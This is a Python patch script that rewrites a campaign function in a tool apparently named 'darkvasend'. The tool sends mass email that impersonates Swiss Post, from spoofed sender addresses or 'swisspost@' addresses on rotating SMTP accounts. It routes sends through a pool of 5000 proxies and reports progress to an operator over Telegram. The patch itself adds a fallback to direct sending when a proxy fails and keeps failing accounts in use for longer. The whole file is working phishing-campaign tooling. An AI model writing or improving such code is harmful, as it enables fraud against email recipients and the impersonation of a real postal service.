#!/usr/bin/env python3
"""
Patch: Fix _run_swisspost_campaign proxy fallback + dead SMTP logic.

Root cause: 5000 proxies (p.shifter.io:443) are active but never tested/working.
Campaign forces all sends through proxy → proxy fails → SMTP marked dead → all SMTP dead.
Health check doesn't use proxy → reports OK.

Fixes:
1. Proxy fallback: if proxy fails, retry direct (no proxy)
2. Only mark SMTP dead on AUTH_FAIL (not proxy/timeout/DATA errors)
3. For DATA/SENDER rejection: try basique mode before marking dead
4. Add error logging with proxy/direct info
5. Track retry_count per SMTP — only dead after 2 consecutive failures
"""

import re

TARGET = "/opt/darkvasend/auditguard/sender_bot.py"

# Read the file
with open(TARGET, "r") as f:
    content = f.read()

# Find and replace the _run_swisspost_campaign function
OLD_FUNC_START = "async def _run_swisspost_campaign(campaign_id, db_path, chat_id, mode=\"spoof\"):"
OLD_FUNC_END = "    mgr.close()\n    proxy_pool.close()"

# Find the function boundaries
start_idx = content.index(OLD_FUNC_START)
end_idx = content.index(OLD_FUNC_END, start_idx) + len(OLD_FUNC_END)

# The new function
NEW_FUNC = '''async def _run_swisspost_campaign(campaign_id, db_path, chat_id, mode="spoof"):
    from .campaign_sender import CampaignManager, send_clean
    from .spoof_templates import get_template
    from .proxy_pool import ProxyPool
    from .db import send_telegram

    mgr = CampaignManager(db_path)
    camp = mgr.get_campaign(campaign_id)
    if not camp:
        mgr.close()
        return

    smtp_list = mgr.get_smtp_for_campaign(campaign_id)
    if not smtp_list:
        send_telegram("CAMP #" + str(campaign_id) + ": aucun SMTP", chat_id)
        mgr.close()
        return

    mgr.update_campaign_status(campaign_id, "running")

    rate = camp["rate_per_minute"] or 30
    delay = 60.0 / rate

    proxy_pool = ProxyPool(db_path)
    proxy_count = proxy_pool.count_active()

    sent = 0
    failed = 0
    spoof_ok = 0
    basique_ok = 0
    smtp_idx = 0
    start_time = time.time()
    dead_smtps = set()  # Track dead SMTP IDs (AUTH fail only)
    basique_smtps = set()  # Track SMTPs that only work in basique mode
    smtp_fail_count = {}  # Track consecutive failures per SMTP

    loop = asyncio.get_event_loop()

    send_telegram(
        "CAMP SWISS POST #" + str(campaign_id) + " LANCEE\\n"
        "Mode: " + mode + " | Rate: " + str(rate) + "/min\\n"
        "SMTP: " + str(len(smtp_list)) + " | Recipients: " + str(camp["total_recipients"]) + "\\n"
        "Proxies: " + str(proxy_count) + " (fallback direct si echec)",
        chat_id)

    while True:
        recipient = mgr.claim_recipient(campaign_id)
        if not recipient:
            break

        active_smtp = [s for s in mgr.get_smtp_for_campaign(campaign_id) if s["id"] not in dead_smtps]
        if not active_smtp:
            send_telegram("CAMP #" + str(campaign_id) + ": TOUS SMTP DOWN!", chat_id)
            break

        to_email = recipient["email"]
        html_body = camp["letter_html"].replace("{{RECIPIENT_EMAIL}}", to_email)

        from_name = camp["from_name"]
        from_email = camp["from_email"]

        # Try each SMTP until one works for this recipient
        success = False
        used_mode = ""
        last_err = ""

        for attempt in range(len(active_smtp)):
            smtp = active_smtp[(smtp_idx + attempt) % len(active_smtp)]

            if smtp["id"] in dead_smtps:
                continue

            smtp_config = {
                "host": smtp["host"], "port": smtp["port"],
                "username": smtp["username"], "password": smtp["password"],
                "from_email": smtp.get("from_email", "") or smtp["username"],
            }

            # Decide mode for this SMTP
            use_basique = smtp["id"] in basique_smtps

            if use_basique:
                domain = smtp["username"].split("@")[1] if "@" in smtp["username"] else smtp["host"]
                send_from = "swisspost@" + domain
            else:
                send_from = from_email

            # === SEND WITH PROXY FALLBACK ===
            # Step 1: Try with proxy (if available)
            proxy = proxy_pool.get_next() if proxy_count > 0 else None
            r = await loop.run_in_executor(None, lambda sc=smtp_config, sf=send_from, px=proxy: send_clean(
                sc, from_name, sf, to_email,
                camp["subject"], html_body, camp.get("reply_to", ""), px))

            # Step 2: If proxy failed, RETRY DIRECT (no proxy)
            if not r["success"] and proxy is not None:
                proxy_err = r.get("error", "")
                print("[CAMP SP] Proxy failed for " + smtp["host"] + ": " + proxy_err + " — retrying direct", flush=True)
                r = await loop.run_in_executor(None, lambda sc=smtp_config, sf=send_from: send_clean(
                    sc, from_name, sf, to_email,
                    camp["subject"], html_body, camp.get("reply_to", ""), None))

            if r["success"]:
                success = True
                used_mode = "basique" if use_basique else "spoof"
                smtp_fail_count[smtp["id"]] = 0  # Reset fail counter
                break
            else:
                last_err = r.get("error", "?")
                print("[CAMP SP] SMTP " + smtp["host"] + " failed: " + last_err, flush=True)

                # AUTH fail = dead immediately
                if "AUTH" in last_err:
                    dead_smtps.add(smtp["id"])
                    mgr.deactivate_smtp(smtp["id"], last_err)
                    print("[CAMP SP] SMTP " + smtp["host"] + " marked DEAD (AUTH)", flush=True)
                # DATA/SENDER rejection in spoof mode → try basique
                elif not use_basique and mode == "both":
                    domain = smtp["username"].split("@")[1] if "@" in smtp["username"] else smtp["host"]
                    bas_from = "swisspost@" + domain
                    # Try basique direct (no proxy)
                    r2 = await loop.run_in_executor(None, lambda sc=smtp_config, bf=bas_from: send_clean(
                        sc, from_name, bf, to_email,
                        camp["subject"], html_body, camp.get("reply_to", ""), None))
                    if r2["success"]:
                        success = True
                        used_mode = "basique"
                        basique_smtps.add(smtp["id"])
                        smtp_fail_count[smtp["id"]] = 0
                        break
                    else:
                        # Track consecutive failures — only dead after 3
                        fc = smtp_fail_count.get(smtp["id"], 0) + 1
                        smtp_fail_count[smtp["id"]] = fc
                        if fc >= 3:
                            dead_smtps.add(smtp["id"])
                            print("[CAMP SP] SMTP " + smtp["host"] + " marked DEAD (3 consecutive fails)", flush=True)
                else:
                    # Spoof-only mode: DATA/SENDER rejection or timeout
                    # Track consecutive failures — only dead after 3
                    fc = smtp_fail_count.get(smtp["id"], 0) + 1
                    smtp_fail_count[smtp["id"]] = fc
                    if fc >= 3:
                        dead_smtps.add(smtp["id"])
                        print("[CAMP SP] SMTP " + smtp["host"] + " marked DEAD (3 consecutive fails)", flush=True)

        smtp_idx += 1

        if success:
            info = smtp["host"] + " [" + used_mode + "]"
            mgr.mark_sent(recipient["id"], info)
            mgr.increment_smtp_daily(smtp["id"])
            sent += 1
            if used_mode == "basique":
                basique_ok += 1
            else:
                spoof_ok += 1
        else:
            mgr.mark_failed(recipient["id"], last_err, "all_failed")
            failed += 1

        # Progress every 25 sends
        if (sent + failed) % 25 == 0 and (sent + failed) > 0:
            elapsed = time.time() - start_time
            rpm = sent / (elapsed / 60) if elapsed > 0 else 0
            alive = len(active_smtp) - len(dead_smtps)
            send_telegram(
                "CAMP SP #" + str(campaign_id) + "\\n"
                "Sent: " + str(sent) + " (spoof:" + str(spoof_ok) + " bas:" + str(basique_ok) + ")\\n"
                "Failed: " + str(failed) + " | " + str(int(rpm)) + "/min\\n"
                "SMTP alive: " + str(alive), chat_id)

        await asyncio.sleep(delay)

    status = "finished" if not mgr.claim_recipient(campaign_id) else "stopped"
    mgr.update_campaign_status(campaign_id, status)
    elapsed = time.time() - start_time
    stats = mgr.get_stats(campaign_id)
    send_telegram(
        "=============================\\n"
        "  SWISS POST #" + str(campaign_id) + " " + status.upper() + "\\n"
        "=============================\\n"
        "Sent: " + str(stats.sent) + " (spoof:" + str(spoof_ok) + " bas:" + str(basique_ok) + ")\\n"
        "Failed: " + str(stats.failed) + "\\n"
        "Pending: " + str(stats.pending) + "\\n"
        "SMTP dead: " + str(len(dead_smtps)) + "\\n"
        "Time: " + str(int(elapsed)) + "s", chat_id)
    mgr.close()
    proxy_pool.close()'''

# Replace the function
new_content = content[:start_idx] + NEW_FUNC + content[end_idx:]

# Write the patched file
with open(TARGET, "w") as f:
    f.write(new_content)

print("PATCH APPLIED OK")
print("Changes:")
print("  1. Proxy fallback: retry direct when proxy fails")
print("  2. Only AUTH_FAIL marks SMTP dead immediately")
print("  3. Other errors need 3 consecutive fails before dead")
print("  4. Added logging for each failure")
print("  5. Basique fallback retries direct (no proxy)")
